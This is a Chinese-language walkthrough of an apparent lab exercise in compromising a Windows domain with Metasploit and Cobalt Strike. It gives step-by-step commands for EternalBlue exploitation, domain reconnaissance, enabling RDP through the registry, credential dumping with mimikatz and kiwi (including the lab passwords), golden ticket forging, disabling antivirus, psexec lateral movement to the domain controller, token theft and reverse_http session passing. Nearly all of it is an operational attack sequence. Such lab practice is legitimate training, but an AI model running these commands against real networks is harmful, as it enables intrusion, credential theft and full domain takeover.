    0x00 域渗透拓扑图

    1. 攻击主机：（kali）192.168.111.3
    2. 内外网靶机：（WEB）192.168.111.80/10.10.10.80、（PC）192.168.111.201/10.10.10.201
    3. 第二层靶机：（DC）10.10.10.10

    0x10 MSF域渗透

    1. netdiscover #查找存活主机
    3. nmap -sT -Pn -p- -vv 192.168.111.80 192.168.111.201 #扫描全端口
    5. 开启445，MSF验证MS17_010
    6. exploit/windows/smb/ms17_010_eternalblue
    8. getuid #已是管理员，不是可 getsystem 尝试简单提权，再验证 getuid

    0x11 域信息搜集

    1. shell #切入终端shell
    2. chcp 65001 #显示乱码，切换编码
    3. hostname #查看本地计算机名，得WEB
    4. whoami #对比查看当前用户是否域用户
    5. 本地账户登录，返回：计算机名\账户名
    6. 域账户登录，返回：非计算机名\帐户名
    9. net user #查看本地用户
    10. net user /domain #查看域用户，得域名DC.de1ay.com、域控主机名DC
    12. ipconfig /all #查看所有网卡信息，得域de1ay.com，得其他网段10.10.10.*
    14. net time /domain #查看域时间（可判断是否存在域），得域名DC.de1ay.com、域控主机名DC
    16. net time \\DC
    18. net time \\10.10.10.10
    20. net view #显示域、计算机或由指定计算机共享资源的列表
    21. net view /domain #查询域列表
    22. net view /domain:[domain_name] #显示域、计算机或由指定计算机共享资源的列表
    23. net view \\ip #查看某IP共享
    25. net localgroup administrators /domain #查看域管理员：Administrator、de1ay
    27. net group /domain #查看所有域用户组列表
    29. net group "domain computers" /domain #查看域成员列表
    31. net group "enterprise admins" /domain #查看企业管理员列表
    33. net group "domain admins" /domain #查看域管理员列表
    35. net group "domain controllers" /domain #查看域控列表
    37. ping DC #ping域控，得域控IP
    38. nltest /domain_trusts /all_trusts /v /server:10.10.10.10 #查看所有域信任的列表
    40. nltest /dsgetdc:de1ay.com /server:10.10.10.10 #查看域信任的相关信息

    0x12 本地信息搜集

    1. systeminfo > c:/systeminfo.txt #查看系统详细配置信息
    2. netstat -ano #查看网络连接情况
    3. tasklist /SVC >> tasklist.txt #查看进程与PID列表
    4. 在线杀软对比http://tools.mo60.cn/
    6. REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber #查看RDP端口,3389十六进制是0xd3d
    8. REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f #开启3389
    9. REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f #关闭3389

    0x13 meterpreter攻击hash

    1. hashdump #administrator密码空，de1ay密码!QAZ2wsx
    3. load mimikatz #旧版，加载mimikatz模块
    4. msv #获取登录密码的hash值
    5. kerberos #获取明文密码
    6. mimikatz_command -f samdump::hashes #第二种获取hash
    7. mimikatz_command -f sekurlsa::searchPasswords #获取明文密码
    8. wdigest #第三种密码
    9. tspkg #第四种密码
    10. run post/windows/gather/smart_hashdump
    12. load kiwi #新版
    13. help kiwi

    14. creds_all #列出所有凭据（msv凭据、wdigest凭据、tspkg凭据、kerberos凭据）
    17. kiwi_cmd sekurlsa::logonpasswords #执行mimikatz相关命令，获取domain、NTLM、username
    19. golden_ticket_create -d [domain] -k [NTLM] -s [SID] -u [username] -t /root/tmp/mssql.ticket #生成黄金票据
    20. kerberos_ticket_use /root/tmp/mssql.ticket #票据存入内存
    21. kerberos_ticket_list #列出票据

    3. use post/multi/recon/local_exploit_suggester #搜索提权exp，run post/windows/gather/enum_patches 补丁信息

    2. 关掉杀软

    0x16 域控

    1. 获取de1ay是域管理员，密码1qaz@WSX，直接域用户登录
    4. psexec64.exe \\域控IP cmd.exe #域控shell
    6. 存在域管进程，迁移到域管进程

    0x20 CS域渗透

    1. 获取meterpreter后，MSF派生shell给CS，CS设置监听
    3. use exploit/windows/local/payload_inject
    4. set payload windows/meterpreter/reverse_http
    5. set DisablePayloadHandler true #使用现有session，不再新建
    9. sleep 3 #设置延时3秒
    10. shell whoami #执行系统命令
    12. hash #获取hash
    14. logonpasswords #执行mimikatz
    16. view——credentials #列出所有凭证
    18. 内网横向：右击Beacon——explore——net view或port scan
    20. 选arp，icmp可能禁ping
    22. SMB Beacon和psexec传递
    23. 创建新监听
    25. 右键已有Beacon——spawn（生成会话/派生），选择刚新建的监听
    29. 选域控主机psexec
    32. 成功上线
    35. hashdump
    37. token窃取
    40. login——psexec——不选用户名密码，勾选token，再上线

    0x21 CS派生给MSF

    1. MSF设置监听，CS创建监听
    3. 右击已有Beacon，且与MSF网络相通，spawn——选刚创建的监听

    MSF域渗透

    MSF几个设置参数

    1. set ExitOnSession false #接收session后保持监听，防止假死或假session
    2. set SessionCommunicationTimeout 0 #默认情况下，session在300秒内无任何活动，就会被杀死，防止此情况则设置为0
    3. set SessionExpirationTimeout 0 #默认情况下，session在一周后强制被关闭，防止则要设置为0
    4. exploit -j -z #后台持续监听
